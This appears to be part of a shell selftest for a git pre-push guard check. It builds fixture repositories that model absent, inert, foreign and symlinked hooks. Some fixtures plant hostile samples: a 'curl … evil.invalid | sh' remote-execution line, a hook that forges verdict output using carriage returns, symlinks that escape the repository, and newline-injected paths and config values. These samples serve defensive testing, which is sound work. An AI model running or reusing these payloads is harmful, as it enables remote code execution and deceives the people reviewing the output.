    # CLAUDE.md IS PRESENT IN BOTH CLASSES and discriminates only by CONTENT. This is the single most
    # important property of this fixture. incept.sh:540 renames the principles CLAUDE.md away, then
    # incept.sh:561 immediately RE-CREATES CLAUDE.md from templates/PROJECT-CLAUDE-TEMPLATE.md — which is
    # why inception-done.sh:41-42 requires BOTH files of a done inception. An earlier revision of this
    # fixture gave `incepted` no CLAUDE.md and `kit-source` only a CLAUDE.md; that inversion made the
    # predicate `[ ! -f CLAUDE.md ]` pass every leg while classifying every REAL incepted tree as
    # kit-source — silent, fail-open, in exactly the fresh clone this slice exists for. The fixture must
    # not be able to teach that again, so:
    #   incepted   -> ENGINEERING-PRINCIPLES.md carrying the principles title (it IS the renamed file)
    #                 + a PROJECT-shaped CLAUDE.md ("**Project:**"), which never carries that title
    #                 (measured: the phrase does not occur in templates/PROJECT-CLAUDE-TEMPLATE.md)
    #   kit-source -> NO ENGINEERING-PRINCIPLES.md (incept.sh:304 refuses a tree that has one) + a
    #                 principles CLAUDE.md carrying the literal "Engineering Principles & Definition of
    #                 Done" — the exact marker incept.sh:305 keys on to detect an un-incepted kit
    # Legs S1/S2 lock both shapes against the same drift.
    _d=$(mktemp -d)
    if [ -n "${3:-}" ]; then
      # Renamed BEFORE `git init` so the repo never records the old path, and `|| return 1` so an
      # unrenameable fixture surfaces through the caller's existing unbuildable guard rather than
      # silently testing the WRONG (safe) path — a hostile-path leg that quietly ran on a benign path
      # would be green and vacuous, which is the failure this whole fix-loop is about.
      mv -- "$_d" "$_d$3" 2>/dev/null || { rm -rf "$_d" 2>/dev/null; return 1; }
      _d="$_d$3"
    fi
    ( cd "$_d" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git init -q ) >/dev/null 2>&1
    mkdir -p "$_d/hooks" "$_d/docs/architecture"
    cp "$K11_ROOT/hooks/pre-push" "$_d/hooks/pre-push"
    printf '# ADR-000 — stack (fixture)\n' > "$_d/docs/architecture/ADR-000-stack.md"
    if [ "$1" = incepted ]; then
      printf '.kit-manifest\ndocs/architecture/ADR-000-stack.md\nhooks/pre-push\nscripts/preflight.sh\n' > "$_d/.kit-manifest"
      printf '# Engineering Principles & Definition of Done\n\n(fixture — incept.sh:540 renamed the kit CLAUDE.md to this)\n' > "$_d/ENGINEERING-PRINCIPLES.md"
      # Deliberately keeps incept.sh:558's post-rename "Principles + Definition of Done:" line: it is the
      # nearest near-miss to the kit-source marker, so a predicate that greps CLAUDE.md too loosely
      # ("Definition of Done") is caught here rather than in production. Written without the surrounding
      # backticks the real doc has, purely because backticks in a single-quoted printf are SC2016.
      printf '# k11-fixture — Claude Project Guide\n\n**Project:** k11-fixture\n**Intent owner:** k11\n**Status:** Inception\n\n**Principles + Definition of Done:** ENGINEERING-PRINCIPLES.md\n' > "$_d/CLAUDE.md"
    else
      printf '# Engineering Principles & Definition of Done\n\n**Status:** MANDATORY (fixture — un-incepted kit source tree)\n' > "$_d/CLAUDE.md"
    fi
    case "$2" in
      installed)    cp "$K11_ROOT/hooks/pre-push" "$_d/.git/hooks/pre-push"; chmod +x "$_d/.git/hooks/pre-push" ;;
      inert)        cp "$K11_ROOT/hooks/pre-push" "$_d/.git/hooks/pre-push"; chmod -x "$_d/.git/hooks/pre-push" ;;
      unreadable)   cp "$K11_ROOT/hooks/pre-push" "$_d/.git/hooks/pre-push"; chmod 000 "$_d/.git/hooks/pre-push" ;;
      foreign)      printf '#!/bin/sh\nexit 0\n' > "$_d/.git/hooks/pre-push"; chmod +x "$_d/.git/hooks/pre-push" ;;
      foreign-inert) printf '#!/bin/sh\nexit 0\n' > "$_d/.git/hooks/pre-push"; chmod -x "$_d/.git/hooks/pre-push" ;;
      none)         rm -f "$_d/.git/hooks/pre-push" ;;
      # THE J2 ATTACK FIXTURE (T2 fix-loop). Guard ABSENT, so the refusal takes the `absent` arm and
      # reaches for an install SOURCE — but the tree's own hooks/pre-push is NOT the kit's guard. This
      # models the two trees where that matters: a repo the operator did not author, and (under
      # --allow-nested) an enclosing repo. The payload is inert-by-construction — `.invalid` is the
      # RFC 2606 reserved TLD, so it can never resolve — but it is shaped like the real thing so a
      # reviewer reading a FAIL line sees exactly what the old code told a human to install.
      # NO KIT_GUARD_CORE marker, which is the whole point: the marker IS the definition of "the kit's".
      none-foreign-src) rm -f "$_d/.git/hooks/pre-push"
                    printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$_d/hooks/pre-push"
                    chmod +x "$_d/hooks/pre-push" ;;
      # The cheap sibling: an incepted tree that LOST hooks/pre-push. The old refusal printed a `cp`
      # against a path that does not exist — a fix line that cannot work.
      none-no-src)  rm -f "$_d/.git/hooks/pre-push"; rm -f "$_d/hooks/pre-push" ;;
      # none-fifo-src is the LOW-2 fixture: the install SOURCE is not a regular file. The destination
      # side has tested `[ -f "$GUARD_HOOK" ]` since T1; the source side read it with `grep -q` and then
      # `shasum` with no such test, and both of those reads are UNBOUNDED. MEASURED (2026-07-21):
      # `hooks/pre-push -> /dev/zero` never terminated, and with a FIFO the run stops dead after the
      # "no local guard at all" line with `grep -q KIT_GUARD_CORE <fifo>` blocked on open — a PR can
      # introduce a symlink (symlinks are tracked git content) and stall any CI job running preflight
      # until the job timeout. A hung gate is worse than a red one: it burns the runner and reports
      # nothing.
      # A FIFO, NOT /dev/zero: it needs no special device to exist on the runner, it is created by a
      # POSIX-required tool, and it is removed with the fixture. `mkfifo` failing takes the established
      # unbuildable route (rm + return 1) rather than dying under `set -e` and leaking the mktemp dir.
      # NOTE THE MUTANT'S FAILURE MODE, because it is not the usual one: with the regular-file test
      # removed this leg does not print FAIL, it HANGS — the whole selftest stops at MP13 and never
      # reaches its `OK:`/`FAIL:` trailer. Measured under a 60 s alarm (2026-07-21): the run stops after
      # D2's last PASS line with no verdict trailer at all, rc 142. That is a kill, and it is
      # deliberately NOT bounded here with a timeout harness: `timeout` is not POSIX, a wall-clock bound
      # in a gate is flaky on a loaded runner, and the unbounded read is the defect itself rather than
      # something to be tolerated with a stopwatch.
      none-fifo-src) rm -f "$_d/.git/hooks/pre-push"; rm -f "$_d/hooks/pre-push"
                    mkfifo "$_d/hooks/pre-push" 2>/dev/null || { rm -rf "$_d" 2>/dev/null; return 1; } ;;
      # hookspath models a husky/lefthook adopter. The stanza is written straight into .git/config
      # because the runtime guard DENIES `git config … core.hooksPath` ("would disable the agent guard").
      # No hook is installed at .git/hooks/pre-push, so without the disclosed skip this fixture REFUSES —
      # that is what makes leg H1 discriminating rather than decorative. .husky is MKDIR'd on purpose:
      # since the skip fires when the value NAMES a dir other than the repo's default hooks dir, an
      # absent .husky would make H1 green via a resolution accident instead of via a genuine redirect.
      # (An earlier revision of this sentence said "the two dirs RESOLVING DIFFERENTLY" — the premise
      # the code comment at the skip stanza itself records as OVERSTATED, kept here as fix-loop residue
      # after that stanza had been corrected. Finding Y6.)
      hookspath)    rm -f "$_d/.git/hooks/pre-push"; mkdir -p "$_d/.husky"
                    printf '[core]\n\thooksPath = .husky\n' >> "$_d/.git/config" ;;
      # hookspath-tracked models the kit's OWN documented second install (brownfield.md §2 step 5(a)):
      # core.hooksPath naming the repo's own TRACKED hooks/ dir, where the kit's committed hook already
      # is. The fixture keeps hooks/pre-push (k11_fx copies the real one there) and installs NOTHING at
      # the default path, so "judged normally" and "skipped" print opposite things: judged reaches the
      # ladder and reports the guard it finds, skipped prints the deferential line and says the kit is
      # NOT judging hooks/pre-push — on a tree whose hooks/pre-push IS the live guard. Written straight
      # into .git/config for the same reason as the arms around it: the runtime guard human-gates that
      # config key.
      hookspath-tracked) rm -f "$_d/.git/hooks/pre-push"
                    printf '[core]\n\thooksPath = hooks\n' >> "$_d/.git/config" ;;
      # hookspath-tracked-none is its load-bearing sibling: same setting, but the tracked hook is GONE,
      # so nothing runs on push. Judged normally this MISSes and ARMS the refusal; skipped it is silent
      # and arms nothing — the fail-open the skip becomes once the recommended install is taken.
      hookspath-tracked-none) rm -f "$_d/.git/hooks/pre-push"; rm -f "$_d/hooks/pre-push"
                    printf '[core]\n\thooksPath = hooks\n' >> "$_d/.git/config" ;;
      # hookspath-noop models the tooling that writes the setting that redirects NOTHING. Judged
      # normally (leg H2) — treating "the key is set" as "the key redirects" would go silent on exactly
      # the unguarded fresh clone K11 exists for, which is why this arm installs NO hook.
      hookspath-noop) rm -f "$_d/.git/hooks/pre-push"
                    printf '[core]\n\thooksPath = .git/hooks\n' >> "$_d/.git/config" ;;
      # hookspath-escape is the HOSTILE-VALUE fixture: the kill decision the printf fix at the skip
      # stanza otherwise ships without. The DOUBLE backslash is load-bearing and was measured
      # (2026-07-21, git 2.48.1) — git's config parser un-escapes it, so:
      #   file `hooksPath = "a\\nb"`  -> value is the FOUR characters  a \ n b   <- what this arm wants
      #   file `hooksPath = "a\nb"`   -> value is a REAL newline (the residual disclosed at the stanza;
      #                                  printf cannot defend that one, and nothing here pretends it can)
      # A four-character `a\nb` is inert under printf '%s\n' and expands into an extra output line under
      # any `echo` that honours backslash escapes (measured: dash, and this host's /bin/sh). The value
      # resolves against neither root, so the skip stanza — the code path under test — is what prints.
      hookspath-escape) rm -f "$_d/.git/hooks/pre-push"
                    printf '[core]\n\thooksPath = "a\\\\nb"\n' >> "$_d/.git/config" ;;
      # --- fixtures added by the FINAL fix-loop (the reviewers' own attacks) --------------------
      # none-forged-src is the X1 fixture, and its ONLY difference from none-foreign-src is the one
      # thing that matters: the hostile hook CARRIES the KIT_GUARD_CORE token, in a comment. That is
      # the attacker none-foreign-src did not model — MP7 passed because its fixture omitted a public
      # substring anyone can type. Same inert-by-construction payload (`.invalid` is RFC 2606 reserved).
      # The payload ALSO tries to forge a verdict line out of the file's own CONTENT, because showing a
      # human ANY of the file was itself an output-forging surface and inventing that surface without a
      # leg would be this fix-loop repeating its own finding. It did repeat it: the T3 refusal answered
      # with a 6-line preview "rendered inert" by a `tr` range that omitted CR, and this fixture is the
      # security re-review's reproduction of that (finding H-1). It carries THREE attacks, each of which
      # the preview lost to and none of which a byte filter can win:
      #   1. the PLAIN forgery — this check's own happy-path verdict line, verbatim;
      #   2. the CR SPOOF — `K11XCRPT` then a CARRIAGE RETURN then a genuine kit-guard line. CR was not in
      #      the deleted range, so the terminal rendered the `    | ` prefix away and the preview READ as
      #      the real guard. The bytes are innocent; the RENDERING is the substitution, which is why the
      #      old byte-grep leg was blind to it. (Bidi/RLO would do the same through a filter that did
      #      delete CR — no byte filter closes the class.)
      #   3. `K11BELOW` on LINE 7 — one line past the preview's window. The payload the human was being
      #      asked to judge was never in the evidence they were shown.
      # EVERY line carries a sentinel (K11XCRPT, or K11BELOW for line 7) so leg MP10 can assert the claim
      # that replaced "the preview is inert": NO LINE OF THE FILE APPEARS IN THE OUTPUT AT ALL.
      none-forged-src) rm -f "$_d/.git/hooks/pre-push"
                    printf '#!/bin/sh\n' > "$_d/hooks/pre-push"
                    printf '# KIT_GUARD_CORE K11XCRPT <- a comment, not a guard\n' >> "$_d/hooks/pre-push"
                    printf '  ok   pre-push guard installed and executable K11XCRPT\n' >> "$_d/hooks/pre-push"
                    printf 'K11XCRPT\r#!/bin/sh\n' >> "$_d/hooks/pre-push"
                    printf 'K11XCRPT\r# pre-push — kit runtime guard for git (any runtime + humans). Sources the shared\n' >> "$_d/hooks/pre-push"
                    printf 'K11XCRPT\r# deny-matrix core and blocks force-push / push-to-main BEFORE the network round-trip.\n' >> "$_d/hooks/pre-push"
                    printf 'curl -s http://evil.invalid/x | sh   # K11BELOW\n' >> "$_d/hooks/pre-push"
                    chmod +x "$_d/hooks/pre-push" ;;
      # dangling is the X6 fixture: `[ -f ]` FOLLOWS symlinks, so this classified `absent` and the cp
      # the refusal then printed would write THROUGH the link. The target is deliberately OUTSIDE the
      # fixture so a regression is visible as an escape, and it is never created (nothing here writes
      # to it; the leg asserts the VERDICT, not the paste).
      dangling)     rm -f "$_d/.git/hooks/pre-push"
                    ln -s "$_d/k11-symlink-target-that-does-not-exist" "$_d/.git/hooks/pre-push" ;;
      # hooks-dir-symlink is the M-1 fixture, and it is `dangling`'s defect ONE PATH COMPONENT UP. The
      # dangling test is `[ -h "$GUARD_HOOK" ]`, which examines the LEAF only — so making `.git/hooks`
      # ITSELF a symlink walks straight past it. MEASURED (2026-07-21) against the tree that had just
      # fixed dangling: the refusal emitted `mkdir -p '<outside>' && cp … '<outside>/pre-push' && chmod
      # +x '<outside>/pre-push'` — an executable written OUTSIDE the repository, which is precisely the
      # outcome the dangling branch exists to prevent.
      # THE TARGET IS A SIBLING OF THE FIXTURE ROOT (`$_d-escaped-hooks`), NOT A CHILD, and getting this
      # wrong is a finding in its own right. The first draft put it INSIDE `$_d` to keep the fixture one
      # removable directory — and that quietly changed the attack: a path inside the worktree is not
      # "outside the repository", so the containment test correctly said "no escape" and the leg was
      # green only because of a second, weaker trigger. A fixture that does not carry the attack's
      # essential property tests something else and reports it as the thing you asked for. Caught by
      # mutation, not by reading. The sibling form is the convention legs W1/W2/H3 already use for their
      # `$d-wt` worktrees, and the leg removes it explicitly — no TMPDIR leak.
      hooks-dir-symlink) rm -rf "$_d/.git/hooks"
                    mkdir -p "$_d-escaped-hooks"
                    ln -s "$_d-escaped-hooks" "$_d/.git/hooks" ;;
      # hooks-dir-root is hooks-dir-symlink's ROOT case, and it is a fixture-set gap rather than a new
      # attack: `.git/hooks -> /` escapes exactly as `-> <sibling>` does, but it is the ONE target for
      # which guard_resolve_deep's `${_grd_abs%/}` strips the whole string, so the helper printed the
      # EMPTY STRING WITH RC 0 and the containment test was skipped through a SUCCESS path. MEASURED
      # (2026-07-21, security re-review finding MED-1): the refusal emitted
      # `mkdir -p '/' && cp … '/pre-push' && chmod +x '/pre-push'`.
      # NO DISK RISK IN THIS FIXTURE, and it was checked rather than assumed: preflight never RUNS the
      # command it prints (it is read-only), and `rm -rf <fixture>` does not descend into a symlinked
      # directory — measured with a canary tree behind the link, which survived intact. The leg also
      # unlinks `.git/hooks` explicitly before the `rm -rf`, belt-and-braces, because this repo has twice
      # filled its own disk through a fixture that did something a reader assumed it would not.
      hooks-dir-root) rm -rf "$_d/.git/hooks"
                    ln -s / "$_d/.git/hooks" ;;
      # none-symlink-src is the L-2 fixture: the guard is absent, so the refusal reaches for an install
      # SOURCE, and that source is a SYMLINK. `source: <top>/hooks/pre-push` reads as the tracked in-tree
      # file; the digest and any inspection describe the TARGET. Nothing is forged — but the operator is
      # handed the wrong provenance for the one decision this whole block asks them to make. The planted
      # target is the REAL kit guard, so the cheap KIT_GUARD_CORE filter passes and the evidence block is
      # actually reached (a fixture that got rejected upstream would test nothing). Target inside `$_d`,
      # for the reason hooks-dir-symlink's is: one removable directory, no TMPDIR leak.
      none-symlink-src) rm -f "$_d/.git/hooks/pre-push"
                    mkdir -p "$_d/k11-elsewhere"
                    cp "$K11_ROOT/hooks/pre-push" "$_d/k11-elsewhere/planted"
                    rm -f "$_d/hooks/pre-push"
                    ln -s "$_d/k11-elsewhere/planted" "$_d/hooks/pre-push" ;;
      # none-symlink-src-nl is L-2's OWN attack surface, as a fixture. Printing the resolved symlink
      # TARGET is a new path entering this refusal's output, from the filesystem, i.e. attacker-shaped —
      # so Rule 2 applies to it, and a Rule-2 application with no leg is exactly the claim-not-a-control
      # this file keeps finding. MEASURED BY MUTATION: with the rejection disabled the selftest stayed
      # GREEN, because no fixture reached it. This one does.
      # THE REPOSITORY ROOT IS DELIBERATELY CLEAN — only the link's TARGET carries the newline. A hostile
      # root would be rejected far upstream by the $GUARD_HOOK / $_g_src checks (legs E2/E3/E4) and this
      # leg would be a second copy of those rather than a lock on the new surface. Same separation
      # hookspath-nl needed for the same reason.
      none-symlink-src-nl) rm -f "$_d/.git/hooks/pre-push"
                    _nld="$_d/$(printf 'k11nl\n    cp K11LNKFORGED K11DEST #')"
                    mkdir -p "$_nld" 2>/dev/null || { rm -rf "$_d" 2>/dev/null; return 1; }
                    cp "$K11_ROOT/hooks/pre-push" "$_nld/planted"
                    rm -f "$_d/hooks/pre-push"
                    ln -s "$_nld/planted" "$_d/hooks/pre-push" ;;
      # hookspath-noop-nodir is the Y1 fixture: the no-op value PLUS no default hooks dir at all (a repo
      # created with an empty --template). The old existence-DEPENDENT resolution answered "not a no-op"
      # and the caller skipped — silent on an unguarded incepted tree, the exact inverse of design §8.
      hookspath-noop-nodir) rm -f "$_d/.git/hooks/pre-push"; rm -rf "$_d/.git/hooks"
                    printf '[core]\n\thooksPath = .git/hooks\n' >> "$_d/.git/config" ;;
      # hookspath-nl is the E3 fixture: a SINGLE backslash in the config file, which git un-escapes into
      # a REAL newline (measured 2026-07-21, git 2.48.1 — the counterpart of hookspath-escape's double
      # backslash). This is the residual the T2 stanza disclosed as unfixable-by-printf. It is fixable,
      # just not by printf: the control-character rejection is what closes it.
      #
      # THE SYMLINK IS THE WHOLE FIXTURE, and its first draft without it was a VACUOUS leg — caught by
      # mutation, not by reading. `--git-path` IS hooksPath-aware, so a bare newline-bearing value also
      # makes $GUARD_HOOK carry the newline, and the EARLIER rejection (on $GUARD_HOOK, locked by E4)
      # fires first: removing the core.hooksPath rejection entirely left the leg GREEN. Measured
      # 2026-07-21. Pointing the value at a SYMLINK whose physical target is clean separates them —
      # guard_resolve ends in `pwd -P`, so $GUARD_HOOK comes out as <top>/clean-hooks/pre-push (clean)
      # while $_hp still carries the newline. That is the only shape on this git that reaches the
      # core.hooksPath branch, and it is what makes E3 a lock on THAT rejection rather than a second
      # copy of E4.
      hookspath-nl) rm -f "$_d/.git/hooks/pre-push"
                    mkdir -p "$_d/clean-hooks"
                    ln -s clean-hooks "$_d/$(printf 'a\nb')"
                    printf '[core]\n\thooksPath = "a\\nb"\n' >> "$_d/.git/config" ;;
    esac
    printf '%s\n' "$_d"
  }
  k11_run() {  # <fixture dir> -> the check's output + a GUARD_REFUSE=/GUARD_STATE= trailer, on stdout
    # The export is INSIDE the subshell, so the hermetic pair applies to the check under test and to
    # nothing else in this script (see the HERMETIC BY CONSTRUCTION note above). Every call site pairs
    # this with `|| out="<k11_run aborted>"`: a failing subshell (a cd that fails because mktemp lost the
    # dir — the disk-full condition this repo has actually hit) would otherwise kill the whole selftest
    # under `set -eu` BEFORE its verdict line, which is the one thing a gate must never do.
    # The hermetic pair is a COMMAND PREFIX on the function call, not an `export`: measured in sh, dash
    # and bash --posix, a prefix assignment on a function IS exported to the external commands that
    # function runs (`git` here), which is all this needs — and it keeps the scope to this one call
    # instead of the whole subshell.
    ( cd "$1" \
      && { GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null check_guard_installed || true
           printf 'GUARD_REFUSE=%s GUARD_STATE=%s\n' "${GUARD_REFUSE-unset}" "${GUARD_STATE-unset}"; } ) 2>&1
  }

  # EVERY `d=$(k11_fx …)` BELOW CARRIES `|| d=""` AND THE UNBUILDABLE GUARD. k11_fx is the half that
  # calls `mktemp -d`, i.e. the disk-full trigger — and measured (2026-07-21, with a counting mktemp shim
  # that fails only for the K11 fixtures): an UNGUARDED `d=$(k11_fx …)` under `set -eu` kills the whole
  # selftest at the FIRST fixture with a bare `mktemp: …No space left on device`, printing ZERO verdict
  # lines. That is precisely the silence R0 exists to convert into a real FAIL, reached by a different
  # door — and it silences the trailer line `OK: preflight selftest` with it. Guarding k11_run alone left the louder half open.
  # THE SENTINEL IS DELIBERATE, not a placeholder. On the unbuildable path `d` is set to a path UNDER
  # /dev/null, which is a character device: every operation the legs perform on `$d` — mkdir -p, cd,
  # rm -rf, chmod, grep, -d/-f — fails ENOTDIR for EVERY user including root (measured), so no leg can
  # accidentally create, read or delete anything, and each downstream assertion fails loudly on its own
  # line instead of the run dying. An empty `d` would NOT be safe here: W3's `mkdir -p "$d/src/deep"`
  # would then run against `/src/deep`.
  K11_NOFX=/dev/null/k11-fixture-unbuildable

  # S1/S2 — FIXTURE SHAPE. These assert the FIXTURES, not the check. (T2 fix-loop, finding J6: this used
  # to add "and while guard_tree_class's body is still `:` they are the only K11 legs with teeth" — true
  # of the T1 slice's deliberate red state, vacuous ever since the owner wrote the predicate. Every leg
  # below now has teeth; S1/S2 are no longer the only ones.)
  # They exist because a fixture is a teaching artifact:
  # an inverted one rewards a predicate that is green here and fail-open in production. S1/S2 pin the
  # fixtures to the two real contracts they model — inception-done.sh:41-42 and incept.sh:304-305 — so
  # the inversion cannot return silently.
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/S1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  if [ -f "$d/ENGINEERING-PRINCIPLES.md" ] && [ -f "$d/CLAUDE.md" ]; then
    echo "PASS: K11/S1 the incepted fixture carries BOTH ENGINEERING-PRINCIPLES.md and CLAUDE.md (the conjunction inception-done.sh:41-42 requires)"
  else
    echo "FAIL: K11/S1 the incepted fixture does not satisfy inception-done.sh:41-42 — a CLAUDE.md-presence predicate would be rewarded here and fail open on every real incepted tree"; fail=1
  fi
  if grep -q '\*\*Project:\*\*' "$d/CLAUDE.md" 2>/dev/null && ! grep -q 'Engineering Principles & Definition of Done' "$d/CLAUDE.md" 2>/dev/null; then
    echo "PASS: K11/S1 the incepted fixture's CLAUDE.md is PROJECT-shaped and does NOT carry the un-incepted-kit marker (incept.sh:561)"
  else
    echo "FAIL: K11/S1 the incepted fixture's CLAUDE.md is not project-shaped, or wrongly carries the kit-source marker"; fail=1
  fi
  rm -rf "$d" 2>/dev/null || true
  d=$(k11_fx kit-source none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/S2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  if grep -q 'Engineering Principles & Definition of Done' "$d/CLAUDE.md" 2>/dev/null; then
    echo "PASS: K11/S2 the kit-source fixture's CLAUDE.md carries the literal marker incept.sh:305 keys on"
  else
    echo "FAIL: K11/S2 the kit-source fixture's CLAUDE.md lacks 'Engineering Principles & Definition of Done' — it does not model an un-incepted kit at all"; fail=1
  fi
  if [ ! -e "$d/ENGINEERING-PRINCIPLES.md" ]; then
    echo "PASS: K11/S2 the kit-source fixture has NO ENGINEERING-PRINCIPLES.md (incept.sh:304 refuses a tree that has one)"
  else
    echo "FAIL: K11/S2 the kit-source fixture carries ENGINEERING-PRINCIPLES.md — incept would refuse it, so it is not a kit-source tree"; fail=1
  fi
  rm -rf "$d" 2>/dev/null || true

  # P1 — incepted, guard installed and executable: one quiet ok line, nothing armed (the liveness anchor).
  d=$(k11_fx incepted installed) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/P1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"ok   pre-push guard installed"*) echo "PASS: K11/P1 an installed+executable guard reports ok";; *) echo "FAIL: K11/P1 installed guard not reported ok ($out)"; fail=1;; esac
  case "$out" in *"Runtime guard:"*) echo "PASS: K11/P1 the guard section IS printed on an incepted tree";; *) echo "FAIL: K11/P1 no 'Runtime guard:' section on an incepted tree ($out)"; fail=1;; esac
  # ANCHORED to the section having printed: a bare GUARD_REFUSE=0 is also what a check that does nothing
  # at all emits, so the unanchored form was green under a no-op implementation and proved nothing.
  case "$out" in "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/P1 an installed guard runs the check and arms NO refusal";; *) echo "FAIL: K11/P1 the check either did not run or armed a refusal on an installed guard ($out)"; fail=1;; esac
  # THE HAPPY-PATH CEILING (finding J5) GETS A LEG, because a disclosure with nothing holding it to the
  # code is the very class this fix-loop exists to close. Until now only the REFUSED operator was told
  # the hook is a speed bump — and the operator who reads `ok` is the one most likely to mistake it for
  # "main is protected". Keyed on the two claims that make the caveat mean something (it is NOT a
  # boundary, and --no-verify defeats it), not on the sentence, so a reword survives and a deletion does
  # not. Kill decision: removing the caveat line must turn this RED while every other P1 assertion stays
  # green (measured — it does).
  case "$out" in *"ok   pre-push guard installed and executable"*"not a boundary"*"--no-verify"*) echo "PASS: K11/P1 the happy-path ok line carries the speed-bump-not-a-boundary caveat (the reader most likely to over-read it is the one who sees it)";; *) echo "FAIL: K11/P1 an installed guard reported ok with NO ceiling caveat — the operator least likely to be told is the one most likely to read it as 'main is protected' ($out)"; fail=1;; esac

  # N1 — incepted, hook ABSENT: the fresh-clone case this slice exists for. Must arm the refusal and say
  # WHICH state it is in (absent vs inert drive different fix lines in the main-body refusal).
  d=$(k11_fx incepted none) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/N1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"MISS pre-push guard"*"not installed at"*) echo "PASS: K11/N1 an absent guard is reported MISS, naming the path";; *) echo "FAIL: K11/N1 absent guard not reported ($out)"; fail=1;; esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=absent"*) echo "PASS: K11/N1 an absent guard ARMS the refusal as 'absent'";; *) echo "FAIL: K11/N1 absent guard did not arm the refusal as absent ($out)"; fail=1;; esac

  # N2 — incepted, hook present but NOT executable: git silently ignores it, so this is as unguarded as
  # absent — but it needs a DIFFERENT fix (chmod, not cp), which is why the state is discriminated.
  d=$(k11_fx incepted inert) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/N2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"not executable"*"silently ignores"*) echo "PASS: K11/N2 a non-executable guard is reported as inert, with the reason";; *) echo "FAIL: K11/N2 inert guard not reported ($out)"; fail=1;; esac
  case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=inert"*) echo "PASS: K11/N2 an inert guard ARMS the refusal as 'inert' (not 'absent')";; *) echo "FAIL: K11/N2 inert guard did not arm the refusal as inert ($out)"; fail=1;; esac

  # F1 — incepted, FOREIGN hook (no KIT_GUARD_CORE marker): brownfield parity with inception-done.sh:17 —
  # incept declined to overwrite a pre-existing hook. Reported, never punished.
  d=$(k11_fx incepted foreign) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/F1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"ok"*"foreign hook preserved"*) echo "PASS: K11/F1 a foreign hook is preserved and noted, not failed";; *) echo "FAIL: K11/F1 foreign hook not noted ($out)"; fail=1;; esac
  case "$out" in "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/F1 the check runs on a foreign hook and arms NO refusal";; *) echo "FAIL: K11/F1 the check either did not run or armed a refusal on a foreign hook ($out)"; fail=1;; esac

  # X1 — incepted, foreign hook that is NOT executable. git runs nothing on push, so "foreign hook
  # preserved" would imply a hook is in force that is not. Still non-failing (§4.3 — the kit does not
  # manage a foreign hook); the fix is honest wording, not a refusal.
  d=$(k11_fx incepted foreign-inert) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/X1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_run "$d") || out="<k11_run aborted>"; rm -rf "$d" 2>/dev/null || true
  case "$out" in *"not the kit's, and not executable — nothing runs on push"*) echo "PASS: K11/X1 a non-executable foreign hook is described honestly (nothing runs on push)";; *) echo "FAIL: K11/X1 a non-executable foreign hook was not honestly described ($out)"; fail=1;; esac
  case "$out" in "Runtime guard:"*"GUARD_REFUSE=0 GUARD_STATE="*) echo "PASS: K11/X1 a non-executable foreign hook still arms NO refusal (§4.3)";; *) echo "FAIL: K11/X1 the check either did not run or armed a refusal on a foreign hook (§4.3) ($out)"; fail=1;; esac

  # U1 — incepted, hook that DOES carry KIT_GUARD_CORE but cannot be READ. Before the fix this fell
  # through to the foreign branch (grep cannot tell "no marker" from "cannot read") and was affirmatively
  # mislabelled as a preserved brownfield hook while arming nothing — fail-open behind a reassuring
  # message, and a direct contradiction of design §8 ("absent, inert, or unreadable will refuse").
  if [ "$(id -u)" = "0" ]; then
    echo "SKIP: K11/U1 unreadable-hook leg — running as uid 0, where chmod 000 is not a read barrier (ci.yml runs conformance-core on ubuntu-latest as a non-root user, so CI does exercise it)"
  else
    d=$(k11_fx incepted unreadable) || d=""
    [ -n "$d" ] || { echo "FAIL: K11/U1 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
    out=$(k11_run "$d") || out="<k11_run aborted>"
    chmod 700 "$d/.git/hooks/pre-push" 2>/dev/null || true; rm -rf "$d" 2>/dev/null || true
    case "$out" in *"MISS pre-push guard present but UNREADABLE"*) echo "PASS: K11/U1 an unreadable guard is reported UNREADABLE";; *) echo "FAIL: K11/U1 unreadable guard not reported as unreadable ($out)"; fail=1;; esac
    case "$out" in *"GUARD_REFUSE=1 GUARD_STATE=unreadable"*) echo "PASS: K11/U1 an unreadable guard ARMS the refusal (design §8: absent, inert, OR unreadable)";; *) echo "FAIL: K11/U1 unreadable guard did not arm the refusal ($out)"; fail=1;; esac
    # Keys on "not the kit's", the phrase BOTH foreign wordings share — not on "foreign hook preserved"
    # alone. Measured: with the F8 wording in place, deleting the unreadable branch sends a chmod-000 KIT
    # hook down the foreign path and out as "…not the kit's, and not executable…", which the narrower
    # pattern let through. The claim under test is "the kit never says a KIT hook is not its own", so the
    # assertion must name that claim, not one sentence that happened to express it.
